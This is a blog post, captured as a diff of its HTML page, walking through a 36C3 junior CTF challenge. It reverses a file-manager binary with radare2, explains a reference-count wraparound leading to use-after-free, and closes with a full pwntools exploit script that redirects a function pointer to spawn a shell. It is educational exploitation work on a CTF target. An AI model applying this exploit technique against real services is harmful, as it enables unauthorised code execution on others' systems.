@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Exploiting A Use-After-Free With radare2 - CTF Challenge</title>
+        <style>
+
+    html body {
+        font-family: 'Raleway', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: #ffe135;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/font.css">
+
+
+ <link rel="stylesheet" href="https://bananamafia.dev//css/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/bootstrap-min.css" integrity="">
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/main.css">
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/font-awesome.min.css" integrity="">
+ 
+
+
+<script src="https://bananamafia.dev/js/highlight.min.js"></script>
+
+
+<script src="https://bananamafia.dev/js/python.min.js"></script> 
+<script src="https://bananamafia.dev/js/cpp.min.js"></script> 
+<script src="https://bananamafia.dev/js/json.min.js"></script> 
+<script src="https://bananamafia.dev/js/go.min.js"></script> 
+
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-143157939-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+
+  gtag('config', 'UA-143157939-1');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="https://bananamafia.dev/js/jquery.min.js"></script>
+
+
+<script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
+
+
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.62.0" />
+        
+
+        
+    </head>
+
+    
+
+
+    <body>
+         
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Exploiting A Use-After-Free With radare2 - CTF Challenge</a>
+
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="/">Home</a></li>
+                            
+                                <li><a href="/post/">Posts</a></li>
+                            
+                                <li><a href="/project/">Projects</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="mailto:ps1337@mailbox.org"><i class="fa fa-envelope-o"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://github.com/ps1337/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/CaptnBanana"><i class="fa fa-twitter"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="/index.xml"><i class="fa fa-rss"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://www.youtube.com/watch?v=QKWKUU0XQ8U"><i class="fa fa-envira"></i></a></li>
+                            
+                        </ul>
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/uaf-1/">Exploiting A Use-After-Free With radare2 - CTF Challenge</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reversing"><kbd class="item-tag">reversing</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/cutter"><kbd class="item-tag">cutter</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/heap"><kbd class="item-tag">heap</kbd></a>
+    
+
+</div>
+
+
+    <br>
+    <div class="content-width text-justify"><p>This writeup is about a 36C3 junior CTF challenge called <code>minifd</code> which can be found <a href="https://github.com/fkt/36c3-junior-ctf-pub/tree/master/minifd/distrib">here</a>. The goal is to find and exploit a user-after-free vulnerability in order to spawn a shell on the remote system. Here's the challenge description:</p>
+<p><em>This is a simple file manager implementation supporting basic functionality to create, read, and write files.</em></p>
+<p><em>Please note: This is a prototype implementation. At this point of time, only 16 files can be managed at the same time.</em></p>
+<hr>
+<p>The 16 files are managed in a list that's being held in memory. Files can be created, deleted, edited and duplicated with these commands:</p>
+<ul>
+<li><code>create &lt;string&gt;</code></li>
+<li><code>close &lt;fd&gt;</code></li>
+<li><code>dup &lt;fd&gt;</code></li>
+<li><code>read &lt;fd&gt; &lt;n&gt;</code></li>
+<li><code>write &lt;fd&gt; &lt;n&gt; &lt;string&gt;</code></li>
+</ul>
+<p>The first thing to do, after playing around with the service itself, is to load the challenge binary into a 1337 hacker tool like <code>Cutter</code>. This is a handy GUI for <code>radare2</code>. By making use of the graph view, one can get a good overview of the implementation. Let's have a look at how files are created in <code>sym.create</code>:</p>
+<p><img src="/img/uaf-1/sym_create.png" alt="Graph: sym_create()"></p>
+<p>A few things can be noticed here: First of all, the files are being allocated on the heap - hence the call to <code>calloc()</code>. Also, the size of a single file seems to be 80 bytes in total since that's the amount of bytes that being requested. After requesting a memory chunk, it's being initialized as a new file.</p>
+<h1 id="reversing-the-data-structure">Reversing The Data Structure</h1>
+<p>From the disassembled instructions it's possible to reconstruct the structure that represents a file in memory:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> file {
+    uint8_t refcount; <span style="color:#75715e">// +0x0: mov byte [rax], 1
+</span><span style="color:#75715e"></span>    uint8_t unused_1; <span style="color:#75715e">// +0x1
+</span><span style="color:#75715e"></span>    uint8_t unused_2; <span style="color:#75715e">// +0x2
+</span><span style="color:#75715e"></span>    uint8_t unused_3; <span style="color:#75715e">// +0x3
+</span><span style="color:#75715e"></span>    uint32_t data_len; <span style="color:#75715e">// +0x4: mov dword [rax + 4], 0
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> data; <span style="color:#75715e">// +0x8: mov dword [rax + 8], 0
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// +0x10 ... +0x2F (0x1F length): strcpy
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> close_func; <span style="color:#75715e">// +0x30: lea rax, [sym.c3ctf_file_close]
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> read_func; <span style="color:#75715e">// +0x38: lea rax, [sym.c3ctf_file_read]
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> write_func; <span style="color:#75715e">// +0x40: lea rax, [sym.c3ctf_file_write]
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> dup_func; <span style="color:#75715e">// +0x48: lea rax, [sym.c3ctf_file_dup]
+</span><span style="color:#75715e"></span>};
+</code></pre></div><p>An important thing to notice is that the last four fields are function pointers to the operations that users can call. At last, the file is then added into a slot in the global list of files with the last three lines of disassembled code listed in the graph output above.</p>
+<p>The data types are clear now but how to determine the purpose of the structure fields? Check out the operations that users can invoke on the structure:</p>
+<ul>
+<li><strong>sym.do_dup()</strong>
+<img src="/img/uaf-1/sym_do_dup.png" alt="Graph: sym_do_dup()"></li>
+</ul>
+<p>The first byte of the structure is being checked in <code>sym.do_dup()</code>. If it's not zero, then a call to <code>[rbx + 0x48]</code> is being made. As listed in the structure above, this is a pointer to <code>sym.c3ctf_file_dup()</code>:</p>
+<ul>
+<li><strong>sym.c3ctf_file_dup()</strong>
+<br></li>
+</ul>
+<center>
+<img src="/img/uaf-1/sym_c3ctf_file_dup.png" width="60%" height="60%">
+</center>
+<p>Duplicating files just increases the value stored at the given address. This makes sense for a reference count.</p>
+<ul>
+<li><strong>sym.c3ctf_file_write()</strong>
+<img src="/img/uaf-1/sym_c3ctf_file_write.png" alt="Graph: sym_c3ctf_file_write.png"></li>
+</ul>
+<p>The value at <code>rdi + 4</code> is being compared to the second argument of the function, which is the amount of bytes the user requested to write. If it's below the other value, a jump is being made that skips the re-allocation of the data <code>rbp + 8</code> points to. This essentially re-uses the space of a previous allocation in case the space is sufficient for the new content. If it's not, then a new allocation takes place. By putting this together you can determine that the value at offset <code>+4</code> is the data length and that offset <code>+8</code> points to a heap segment that's filled with data.</p>
+<h1 id="loading-the-struct-in-radare2">Loading The Struct In <code>radare2</code></h1>
+<p>Now that the data structure is known, the best thing to do is to load it into <code>radare2</code> so it can cast memory at a given address to this data type. This is pretty easy and only requires a single command:</p>
+<pre><code class="language-console" data-lang="console">[0x004007c0]&gt; t?
+Usage: t   # cparse types commands
+[...]
+| td[?] &lt;string&gt;             Load types from string
+| ts[?]                      Print loaded struct types
+| tp  &lt;type&gt; [addr|varname]  cast data at &lt;address&gt; to &lt;type&gt; and print it
+[...]
+
+[0x004007c0]&gt; &quot;td struct file {uint8_t refcount;uint8_t unused_1;uint8_t unused_2;uint8_t unused_3;uint32_t data_len;unsigned char* data;unsigned char name[32];void* close_func;void* read_func;void* write_func;void* dup_func;};&quot;
+
+[0x004007c0]&gt; ts
+file
+</code></pre><p>After that it's possible to print a given memory segment as a <code>file</code>:</p>
+<pre><code class="language-console" data-lang="console">[0x00400ad5]&gt; tp file 0x00a5a3f0
+   refcount : 0x00a5a3f0 = 0x01
+   unused_1 : 0x00a5a3f1 = 0x00
+   unused_2 : 0x00a5a3f2 = 0x00
+   unused_3 : 0x00a5a3f3 = 0x00
+   data_len : 0x00a5a3f4 = 0
+       data : 0x00a5a3f8 = (qword)0x0000000000000000
+       name : 0x00a5a400 = [ 0x79, 0x6f, 0x6c, 0x6f, 0x66, 0x69, 0x6c, 0x65, 0x00, [...] ]
+ close_func : 0x00a5a420 = (qword)0x00000000004008ab
+  read_func : 0x00a5a428 = (qword)0x00000000004008d0
+ write_func : 0x00a5a430 = (qword)0x00000000004008f1
+   dup_func : 0x00a5a438 = (qword)0x00000000004008a7
+</code></pre><p>After executing <code>write 0 22 yoloyoloyoloyoloyolyol</code> in the debugged process, the <code>data</code> pointer changes:</p>
+<pre><code class="language-console" data-lang="console">[0x00400ad5]&gt; tp file 0x00a5a3f0
+   refcount : 0x00a5a3f0 = 0x01
+   unused_1 : 0x00a5a3f1 = 0x00
+   unused_2 : 0x00a5a3f2 = 0x00
+   unused_3 : 0x00a5a3f3 = 0x00
+   data_len : 0x00a5a3f4 = 0
+       data : 0x00a5a3f8 = qword)0x0000000000a5a4c0
+       name : 0x00a5a400 = [ 0x79, 0x6f, 0x6c, 0x6f, 0x66, 0x69, 0x6c, 0x65, 0x00, [...] ]
+ close_func : 0x00a5a420 = (qword)0x00000000004008ab
+  read_func : 0x00a5a428 = (qword)0x00000000004008d0
+ write_func : 0x00a5a430 = (qword)0x00000000004008f1
+   dup_func : 0x00a5a438 = (qword)0x00000000004008a7
+
+[0x00400907]&gt; pxq@0x0000000000a5a4c0
+0x00a5a4c0  0x6f6c6f796f6c6f79  0x6f6c6f796f6c6f79   yoloyoloyoloyolo
+0x00a5a4d0  0x00006c6f796c6f79  0x000000000001fb31   yolyol..1.......
+</code></pre><h1 id="exploitation">Exploitation</h1>
+<p>An important thing to notice is that the reference count of an allocated <code>file</code> can be incremented directly by users:</p>
+<center>
+<img src="/img/uaf-1/sym_c3ctf_file_dup.png" width="60%" height="60%">
+</center>
+<p>This gets called without any prior checks for free space in one of the 16 slots. Because of this, the reference count can be incremented until the value wraps around. This makes exploitation possible in this scenario:</p>
+<ol>
+<li>A file <code>a</code> gets allocated</li>
+<li>A file <code>b</code> gets allocated</li>
+<li>The file <code>a</code> gets duplicated so that there exist two file handles that have pointers to the same chunk of heap memory</li>
+<li>The rest of the file table gets filled with files</li>
+<li>At this point the reference count for <code>a</code> is <code>0x2</code> since there are two pointers that reference to it. Now the <code>dup()</code> call will be performed for the file <code>a</code> exactly 255 times. This causes the reference count to wrap around and to contain the value <code>0x1</code> now</li>
+<li>One of the file handles for <code>a</code> gets closed now. The reference count for <code>a</code> is now at <code>0x0</code> and therefore the associated memory chunk with size <code>0x50</code> gets freed. However, there's still a handle available that points to this freed memory region.</li>
+<li>A <code>write</code> operation to <code>b</code> follows. This write has to be exactly of size <code>0x50</code> (80 bytes) to cause the heap manager to place the written bytes into the memory region that was freed previously. The <code>calloc()</code> call will return the same address again. This places a fake object in memory that also contains more or less valid function pointers :)</li>
+<li>An arbitrary operation that involves one of the four function pointers is now being invoked on the remaining handle to <code>a</code>. This causes the application to make a <code>call</code> to the attacker-controlled function pointer</li>
+</ol>
+<p>Let's see how it looks like from a memory perspective. This is the file list after step 6:</p>
+<pre><code class="language-console" data-lang="console">-----------------------------------------
+| fd |         file name                |
+-----------------------------------------
+|  0 |                                  |
+|  1 |                                b |
+|  2 |                                a |
+|  3 |                                x |
+|  4 |                                x |
+|  5 |                                x |
+|  6 |                                x |
+|  7 |                                x |
+|  8 |                                x |
+|  9 |                                x |
+| 10 |                                x |
+| 11 |                                x |
+| 12 |                                x |
+| 13 |                                x |
+| 14 |                                x |
+| 15 |                                x |
+-----------------------------------------
+</code></pre><p>Now step 7 is performed - calling <code>write 1 80 $(ragg2 -r  -P 80)</code> already shows some weird looking results on the UI:</p>
+<pre><code class="language-console" data-lang="console">| fd |         file name                |
+-----------------------------------------
+|  0 |                                  |
+|  1 |                                b |
+|  2 | AAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaA |
+|  3 |                                x |
+|  4 |                                x |
+|  5 |                                x |
+|  6 |                                x |
+|  7 |                                x |
+|  8 |                                x |
+|  9 |                                x |
+| 10 |                                x |
+| 11 |                                x |
+| 12 |                                x |
+| 13 |                                x |
+| 14 |                                x |
+| 15 |                                x |
+-----------------------------------------
+</code></pre><p>This is the file table that <code>obj.files</code> points to:</p>
+<pre><code class="language-console" data-lang="console">[0x7fe5d93a73f2]&gt; pxq@obj.files
+0x006020a0  0x0000000000000000  0x00000000012f0790   ........../.....
+0x006020b0  0x00000000012f0730  0x00000000012f07f0   0./......./.....
+0x006020c0  0x00000000012f0850  0x00000000012f08b0   P./......./.....
+0x006020d0  0x00000000012f0910  0x00000000012f0970   ../.....p./.....
+0x006020e0  0x00000000012f09d0  0x00000000012f0a30   ../.....0./.....
+0x006020f0  0x00000000012f0a90  0x00000000012f0af0   ../......./.....
+0x00602100  0x00000000012f0b50  0x00000000012f0bb0   P./......./.....
+0x00602110  0x00000000012f0c10  0x00000000012f0c70   ../.....p./.....
+</code></pre><p>Now the contents of the third slot are being printed - that's the corrupted file:</p>
+<pre><code class="language-console" data-lang="console">[0x7fe5d93a73f2]&gt; tp file 0x00000000012f0730
+   refcount : 0x012f0730 = 0x41
+   unused_1 : 0x012f0731 = 0x41
+   unused_2 : 0x012f0732 = 0x41
+   unused_3 : 0x012f0733 = 0x42
+   data_len : 0x012f0734 = 1094926657
+       data : 0x012f0738 = (qword)0x4641414541414441
+       name : 0x012f0740 = [ 0x41, 0x41, 0x47, 0x41, 0x41, 0x48, 0x41, 0x41, 0x49, 0x41, 0x41, 0x4a, 0x41, 0x41, 0x4b, 0x41, 0x41, 0x4c, 0x41, 0x41, 0x4d, 0x41, 0x41, 0x4e, 0x41, 0x41, 0x4f, 0x41, 0x41, 0x50, 0x41, 0x41 ]
+ close_func : 0x012f0760 = (qword)0x4153414152414151
+  read_func : 0x012f0768 = (qword)0x5641415541415441
+ write_func : 0x012f0770 = (qword)0x4141584141574141
+   dup_func : 0x012f0778 = (qword)0x416141415a414159
+</code></pre><p>All function pointers are now under control.</p>
+<p>Calling <code>dup 2</code> now causes the application to jump to the attacker-controlled location. Luckily the target binary is compiled without PIC and contains a function called <code>sym.spawn_shell()</code>.</p>
+<p>For reference this is the same region before and after the hax were performed:</p>
+<pre><code class="language-console" data-lang="console">[0x7fe5d93a73f2]&gt; pxq@0x00000000012f0730
+0x012f0730  0x0000000000000000  0x0000000000000000   ................
+0x012f0740  0x0000000000000061  0x0000000000000000   a...............
+0x012f0750  0x0000000000000000  0x0000000000000000   ................
+0x012f0760  0x00000000004008ab  0x00000000004008d0   ..@.......@.....
+0x012f0770  0x00000000004008f1  0x00000000004008a7   ..@.......@.....
+
+[0x7fe5d93a73f2]&gt; pxq@0x00000000012f0730
+0x012f0730  0x4143414142414141  0x4641414541414441   AAABAACAADAAEAAF
+0x012f0740  0x4141484141474141  0x414b41414a414149   AAGAAHAAIAAJAAKA
+0x012f0750  0x4e41414d41414c41  0x41415041414f4141   ALAAMAANAAOAAPAA
+0x012f0760  0x4153414152414151  0x5641415541415441   QAARAASAATAAUAAV
+0x012f0770  0x4141584141574141  0x416141415a414159   AAWAAXAAYAAZAAaA
+</code></pre><p>You can see that the reference count is <code>0x0</code>, the name is <code>a</code> and that the function pointers were still intact before.</p>
+<p>This is my finished exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+
+<span style="color:#f92672">from</span> pwntools_r2 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">tmux</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">splitw</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-v</span><span style="color:#e6db74">&#39;</span>]
+
+r2script <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">#r2.cmd(</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">aa</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">#r2.cmd(</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">dc</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">#r2.cmd(</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">dc</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./fd</span><span style="color:#e6db74">&#34;</span>)
+p <span style="color:#f92672">=</span> r2dbg(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./fd</span><span style="color:#e6db74">&#39;</span>, r2script<span style="color:#f92672">=</span>r2script)
+
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt;</span><span style="color:#e6db74">&#34;</span>)
+
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">create a</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">create b</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">dup 0</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">create x</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">255</span>):
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">dup 0</span><span style="color:#e6db74">&#34;</span>)
+
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">close 0</span><span style="color:#e6db74">&#34;</span>)
+
+FAKESIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x50</span>
+fakeobj <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+fakeobj <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> (FAKESIZE <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>)
+fakeobj <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(binary<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">spawn_shell</span><span style="color:#e6db74">&#39;</span>])
+
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">write 1 80 </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> fakeobj)
+
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">dup 2</span><span style="color:#e6db74">&#34;</span>)
+
+p<span style="color:#f92672">.</span>interactive()
+
+</code></pre></div><h1 id="references">References</h1>
+<ul>
+<li>I've got the idea to reverse engineer and load the <code>file</code> structure from <a href="https://github.com/Dvd848/CTFs/blob/master/2019_36C3_Junior/minifd.md">here</a></li>
+</ul>
+</div>
+
+    
+    
+
+    
+
+    <h4 class="page-header">Related</h4>
+
+     <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/36c3ctf/">36C3 CTF Writeups</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reversing"><kbd class="item-tag">reversing</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/rop-arm-1/">ROP on ARM with radare2</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/rop"><kbd class="item-tag">rop</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploitation"><kbd class="item-tag">exploitation</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/arm"><kbd class="item-tag">arm</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/frida-fuzz/">In-Process Fuzzing With Frida</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/frida"><kbd class="item-tag">frida</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/fuzzing"><kbd class="item-tag">fuzzing</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+
+</div>
+ 
+
+    <footer>
+    <img style="width:42vh" src="/img/tag.png">
+
+    <p class="copyright text-muted">
+
+        © All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>
+    </p>
+</footer>
+</body>
+
+</html>
+    
+
+</main>
